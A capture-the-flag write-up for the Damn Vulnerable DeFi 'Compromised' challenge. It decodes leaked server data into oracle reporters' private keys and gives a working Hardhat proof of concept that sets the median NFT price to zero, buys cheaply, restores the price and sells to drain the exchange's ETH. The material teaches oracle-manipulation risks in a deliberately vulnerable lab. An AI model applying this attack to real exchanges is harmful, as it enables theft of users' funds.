# Damn Vulnerable Defi: 6. Compromised

> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:
>
> ```bash
> HTTP/2 200 OK
> content-type: text/html
> content-language: en
> vary: Accept-Encoding
> server: cloudflare
>
> 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
>
> 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
> ```
>
> A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each
>
> This price is fetched from an on-chain oracle, and is based on three trusted reporters:
>
> - `0xA73209FB1a42495120166736362A1DfA9F95A105`
> - `0xe92401A4d3af5E446d93D11EEc806b1462b39D15`
> - `0x81A5D6E50C214044bE44cA0CB057fe119097850c`
>
> Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.

**Objective of CTF:**

- Steal all ETH in the exchange.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./common/DamnValuableNFT.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/AccessControlEnumerable.sol";

/**
 * @title Exchange
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Exchange is ReentrancyGuard {
  using Address for address payable;

  DamnValuableNFT public immutable token;
  TrustfulOracle public immutable oracle;

  event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
  event TokenSold(address indexed seller, uint256 tokenId, uint256 price);

  constructor(address oracleAddress) payable {
    token = new DamnValuableNFT();
    oracle = TrustfulOracle(oracleAddress);
  }

  function buyOne() external payable nonReentrant returns (uint256) {
    uint256 amountPaidInWei = msg.value;
    require(amountPaidInWei > 0, "Amount paid must be greater than zero");

    // Price should be in [wei / NFT]
    uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
    require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");

    uint256 tokenId = token.safeMint(msg.sender);

    payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);

    emit TokenBought(msg.sender, tokenId, currentPriceInWei);

    return tokenId;
  }

  function sellOne(uint256 tokenId) external nonReentrant {
    require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
    require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");

    // Price should be in [wei / NFT]
    uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
    require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");

    token.transferFrom(msg.sender, address(this), tokenId);
    token.burn(tokenId);

    payable(msg.sender).sendValue(currentPriceInWei);

    emit TokenSold(msg.sender, tokenId, currentPriceInWei);
  }

  receive() external payable {}
}

/**
 * @title TrustfulOracle
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A price oracle with a number of trusted sources that individually report prices for symbols.
 *         The oracle's price for a given symbol is the median price of the symbol over all sources.
 */
contract TrustfulOracle is AccessControlEnumerable {
  bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
  bytes32 public constant INITIALIZER_ROLE = keccak256("INITIALIZER_ROLE");

  // Source address => (symbol => price)
  mapping(address => mapping(string => uint256)) private pricesBySource;

  modifier onlyTrustedSource() {
    require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));
    _;
  }

  modifier onlyInitializer() {
    require(hasRole(INITIALIZER_ROLE, msg.sender));
    _;
  }

  event UpdatedPrice(address indexed source, string indexed symbol, uint256 oldPrice, uint256 newPrice);

  constructor(address[] memory sources, bool enableInitialization) {
    require(sources.length > 0);
    for (uint256 i = 0; i < sources.length; i++) {
      _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);
    }

    if (enableInitialization) {
      _setupRole(INITIALIZER_ROLE, msg.sender);
    }
  }

  // A handy utility allowing the deployer to setup initial prices (only once)
  function setupInitialPrices(
    address[] memory sources,
    string[] memory symbols,
    uint256[] memory prices
  ) public onlyInitializer {
    // Only allow one (symbol, price) per source
    require(sources.length == symbols.length && symbols.length == prices.length);
    for (uint256 i = 0; i < sources.length; i++) {
      _setPrice(sources[i], symbols[i], prices[i]);
    }
    renounceRole(INITIALIZER_ROLE, msg.sender);
  }

  function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
    _setPrice(msg.sender, symbol, newPrice);
  }

  function getMedianPrice(string calldata symbol) external view returns (uint256) {
    return _computeMedianPrice(symbol);
  }

  function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory) {
    uint256 numberOfSources = getNumberOfSources();
    uint256[] memory prices = new uint256[](numberOfSources);

    for (uint256 i = 0; i < numberOfSources; i++) {
      address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
      prices[i] = getPriceBySource(symbol, source);
    }

    return prices;
  }

  function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
    return pricesBySource[source][symbol];
  }

  function getNumberOfSources() public view returns (uint256) {
    return getRoleMemberCount(TRUSTED_SOURCE_ROLE);
  }

  function _setPrice(address source, string memory symbol, uint256 newPrice) private {
    uint256 oldPrice = pricesBySource[source][symbol];
    pricesBySource[source][symbol] = newPrice;
    emit UpdatedPrice(source, symbol, oldPrice, newPrice);
  }

  function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));

    // calculate median price
    if (prices.length % 2 == 0) {
      uint256 leftPrice = prices[(prices.length / 2) - 1];
      uint256 rightPrice = prices[prices.length / 2];
      return (leftPrice + rightPrice) / 2;
    } else {
      return prices[prices.length / 2];
    }
  }

  function _sort(uint256[] memory arrayOfNumbers) private pure returns (uint256[] memory) {
    for (uint256 i = 0; i < arrayOfNumbers.length; i++) {
      for (uint256 j = i + 1; j < arrayOfNumbers.length; j++) {
        if (arrayOfNumbers[i] > arrayOfNumbers[j]) {
          uint256 tmp = arrayOfNumbers[i];
          arrayOfNumbers[i] = arrayOfNumbers[j];
          arrayOfNumbers[j] = tmp;
        }
      }
    }
    return arrayOfNumbers;
  }
}

/**
 * @title TrustfulOracleInitializer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrustfulOracleInitializer {
  event NewTrustfulOracle(address oracleAddress);

  TrustfulOracle public oracle;

  constructor(address[] memory sources, string[] memory symbols, uint256[] memory initialPrices) {
    oracle = new TrustfulOracle(sources, true);
    oracle.setupInitialPrices(sources, symbols, initialPrices);
    emit NewTrustfulOracle(address(oracle));
  }
}
```

## The Attack

In this challenge, we have an exchange contract that allows to swap ether and DVT (DamnValuableToken). The pricing is given via a trusted oracle. Within this trusted oracle, there are several source addresses that are allowed to update the price. The final price during an exchange is taken to be the median of all source reported prices.

Looking at the code itself, there does not seem to be much options to attack. My initial attention went to initializations, as there is a common developer error of not preventing re-initializations and stuff. However, I could not find any. With that said, it was time to look at the hexcode that the problem statement provides us with:

- I put them in hex decoder to see if they mean anything, they don't.
- I treat them as hex, but can't make anything out of it (each has 88 bytes in it).
- Hmm, what if they are encoded? Let us treat this as hexadecmials encoded in base64, as often is the case when data is sent over the network.

Et viola, when we do that we realize both are hexadecimals of 32 bytes! Ethereum private keys are 32-bytes too; coincidence? I think not. Here is a snippet from my challenge code:

```ts
// the data given in challenge
const sniffedData = [
  '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
  '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
];

// decoded to hex from base64
const decodedData = sniffedData
  .map(raw => Buffer.from(raw.split(' ').join(''), 'hex').toString('utf-8')) // eliminate spaces, convert to base64
  .map(b64 => Buffer.from(b64, 'base64').toString('utf-8')); // convert to utf8

// create wallets from the private keys
const sourceAccounts = decodedData.map(key => new ethers.Wallet(key, attacker.provider));
```

With this, we can connect to two out of three source accounts; this means that we can change the median price that the exchange is reading during a swap!

The objective is to steal the funds, not just change the price. So, here is the plan:

1. Set the token price to 0 ETH
2. Buy some NFTs for a price of 1 wei (0 wei reverts due to a `require` statement within the contract)
3. Set the price back to it's initial price
4. Sell the NFTs you bought in step 2

How many NFTs should we buy to drain the contract? Well, the initial price is 999 ETH and the exchange has 9990 ETH. So, if we buy 10 NFTs for free as described above, and the sell it for 999ETH back, we get 9990 ETH from the exchange, basically taking all its ether!

## Proof of Concept

Here is the Hardhat test code to demonstrate the attack:

```ts
describe('Damn Vulnerable Defi 7: Compromised', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let exchange: Exchange;
  let oracle: TrustfulOracle;
  let nftToken: DamnValuableNFT;

  const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
  const NFT_SYMBOL = 'DVNFT';
  const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');
  const SOURCE_ADDRESSES = [
    '0xA73209FB1a42495120166736362A1DfA9F95A105',
    '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
    '0x81A5D6E50C214044bE44cA0CB057fe119097850c',
  ];

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    // initialize balance of the trusted source addresses
    for (const source of SOURCE_ADDRESSES) {
      await ethers.provider.send('hardhat_setBalance', [
        source,
        '0x1bc16d674ec80000', // 2 ETH
      ]);
      expect(await ethers.provider.getBalance(source)).to.equal(ethers.utils.parseEther('2'));
    }

    // attacker starts with 0.1 ETH in balance
    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x16345785d8a0000', // 0.1 ETH
    ]);
    // await setBalance(attacker.address, ethers.utils.parseEther('0.1'));
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(ethers.utils.parseEther('0.1'));

    // deploy the oracle initializer, which creates the oracles itself and setup the trusted sources with initial prices
    const oracleInitializer = await ethers
      .getContractFactory('TrustfulOracleInitializer', owner)
      // deploy oracle initializer
      .then(c =>
        c.deploy(
          SOURCE_ADDRESSES,
          [NFT_SYMBOL, NFT_SYMBOL, NFT_SYMBOL],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
        )
      );

    //  attach to the deployed & initialized oracle
    const initializedOracle = await oracleInitializer.oracle();
    oracle = await ethers.getContractFactory('TrustfulOracle', owner).then(f => f.attach(initializedOracle));

    // deploy the exchange, which also creates the associated ERC721 token
    exchange = await ethers
      .getContractFactory('Exchange', owner)
      .then(f => f.deploy(oracle.address, {value: EXCHANGE_INITIAL_ETH_BALANCE}));

    // attach to existing contract from exchange
    const exchangeToken = await exchange.token();
    nftToken = await ethers.getContractFactory('DamnValuableNFT', owner).then(f => f.attach(exchangeToken));
  });

  it('should drain funds from the exchange', async () => {
    // the data given in challenge
    const sniffedData = [
      '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
      '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
    ];

    // decoded to hex from base64
    const decodedData = sniffedData
      .map(raw => Buffer.from(raw.split(' ').join(''), 'hex').toString('utf-8')) // eliminate spaces, convert to base64
      .map(b64 => Buffer.from(b64, 'base64').toString('utf-8')); // convert to utf8

    // create wallets from the private keys
    const sourceAccounts = decodedData.map(key => new ethers.Wallet(key, attacker.provider));

    // confirm that the created accounts belong to sources
    for (const account of sourceAccounts) {
      expect(SOURCE_ADDRESSES).to.include(account.address);
    }

    // now, we can set the price to anything we like, and commence our attack
    // for good measure, lets set it to be 0
    // since we have 2/3 of oracles, this will set the median price to 0
    for (const account of sourceAccounts) {
      await oracle.connect(account).postPrice(NFT_SYMBOL, 0);
    }

    // now, we will buy 10 NFTs for 1 wei, basically for free
    // we cant use 0 because it will revert due to a requirement in there
    const tokenIds: BigNumber[] = [];
    for (let i = 0; i < 10; ++i) {
      await expect(exchange.connect(attacker).buyOne({value: 1}))
        .to.emit(exchange, 'TokenBought') // check for event to record the tokenId
        .withArgs(attacker.address, (id: BigNumber) => tokenIds.push(id), 0);
    }

    // then, we will set the price back to the initial price, so that it stays the same
    for (const account of sourceAccounts) {
      await oracle.connect(account).postPrice(NFT_SYMBOL, INITIAL_NFT_PRICE);
    }

    // finally, we will sell our NFTs for the initial price
    // this drains the exchange, if you do the math
    for (const tokenId of tokenIds) {
      await nftToken.connect(attacker).approve(exchange.address, tokenId);
      await exchange.connect(attacker).sellOne(tokenId);
    }
  });

  after(async () => {
    // exchange must have lost all ETH
    expect(await ethers.provider.getBalance(exchange.address)).to.be.eq(0);

    // attacker's ETH balance must have significantly increased
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);

    // attacker must not own any NFT
    expect(await nftToken.balanceOf(attacker.address)).to.be.eq(0);

    // NFT price shouldn't have changed
    expect(await oracle.getMedianPrice(NFT_SYMBOL)).to.eq(INITIAL_NFT_PRICE);
  });
});
```
